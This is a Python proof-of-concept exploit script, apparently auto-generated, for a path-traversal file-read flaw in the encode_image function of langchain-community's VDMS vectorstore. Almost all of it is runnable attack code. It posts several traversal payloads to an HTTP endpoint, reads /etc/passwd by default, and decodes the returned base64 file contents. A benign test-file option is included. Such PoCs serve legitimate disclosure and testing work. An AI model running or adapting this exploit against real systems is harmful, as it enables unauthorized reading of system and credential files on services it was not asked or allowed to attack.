#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-003
# Sink: encode_image
# Auto-generated — run with: python3 lfi_sanitization_normalization_applied_encode_image.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The `encode_image` function in VDMS vectorstore directly opens a file
path provided by the caller without validation. The `add_images` method passes
user-controlled `uris` to `encode_image`, allowing arbitrary file reads via path traversal.

This PoC demonstrates reading /etc/passwd (or a benign test file) by exploiting
the path traversal in the `uris` parameter.
"""

import requests
import sys
import os
import tempfile
import base64
import argparse

# Default target - adjust as needed
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_ENDPOINT = "/api/v1/trigger"

def create_test_file():
    """Create a benign test file to demonstrate the vulnerability safely."""
    test_content = "POC_SUCCESS: This file was read via path traversal!"
    test_path = os.path.join(tempfile.gettempdir(), "poc_lfi_test.txt")
    with open(test_path, "w") as f:
        f.write(test_content)
    return test_path, test_content

def exploit_lfi(target_url, endpoint, payload_path):
    """
    Attempt to read a file via path traversal through the add_images endpoint.
    
    Args:
        target_url: Base URL of the vulnerable service
        endpoint: API endpoint path
        payload_path: File path to read (e.g., "../../etc/passwd" or absolute path)
    """
    full_url = f"{target_url.rstrip('/')}{endpoint}"
    
    # The vulnerable function expects a list of URIs (file paths)
    # We send a single URI with path traversal
    payload = {
        "uris": [payload_path]
    }
    
    print(f"[*] Target: {full_url}")
    print(f"[*] Attempting to read: {payload_path}")
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.post(
            full_url,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] HTTP Status: {response.status_code}")
        
        if response.status_code == 200:
            # The response should contain base64-encoded file content
            # Look for base64 data in the response
            response_text = response.text
            
            # Try to find base64-encoded content (the file content is base64 encoded)
            # The response structure depends on the actual implementation
            print(f"[*] Response (first 500 chars): {response_text[:500]}")
            
            # Attempt to decode any base64 content found
            # In a real exploit, you'd parse the JSON response properly
            if "b64_texts" in response_text or "texts" in response_text:
                print("[+] Potential file content found in response!")
                # Try to extract and decode base64 content
                # This is simplified - actual parsing depends on response format
                import re
                b64_matches = re.findall(r'[A-Za-z0-9+/=]{20,}', response_text)
                for b64_str in b64_matches:
                    try:
                        decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
                        if decoded.strip():
                            print(f"[+] Decoded content: {decoded[:200]}")
                    except:
                        pass
        else:
            print(f"[-] Request failed with status {response.status_code}")
            print(f"[-] Response: {response.text[:500]}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {full_url}")
        print("[-] Is the target service running?")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-community-only VDMS vectorstore"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--endpoint",
        default=DEFAULT_ENDPOINT,
        help=f"API endpoint (default: {DEFAULT_ENDPOINT})"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read via path traversal (default: /etc/passwd)"
    )
    parser.add_argument(
        "--safe-test",
        action="store_true",
        help="Use a benign test file instead of /etc/passwd"
    )
    
    args = parser.parse_args()
    
    if args.safe_test:
        # Create a safe test file to demonstrate the vulnerability
        test_path, test_content = create_test_file()
        print(f"[*] Created test file: {test_path}")
        print(f"[*] Test file content: {test_content}")
        payload_path = test_path
    else:
        payload_path = args.file
    
    print(f"\n{'='*60}")
    print("LFI Exploit PoC for langchain-community-only")
    print(f"{'='*60}\n")
    
    # Try multiple path traversal patterns
    payloads = [
        payload_path,  # Absolute path
        f"../../../../../../..{payload_path}",  # Deep traversal
        f"....//....//....//....//....//....{payload_path}",  # Alternative encoding
    ]
    
    for i, payload in enumerate(payloads, 1):
        print(f"\n[Attempt {i}/3]")
        print("-" * 40)
        exploit_lfi(args.target, args.endpoint, payload)
        print("-" * 40)
    
    print("\n[*] Exploit attempts completed.")
    print("[*] If successful, you should see file contents in the response.")
    print("[*] For a real attack, an attacker could read any file on the system.")

if __name__ == "__main__":
    main()
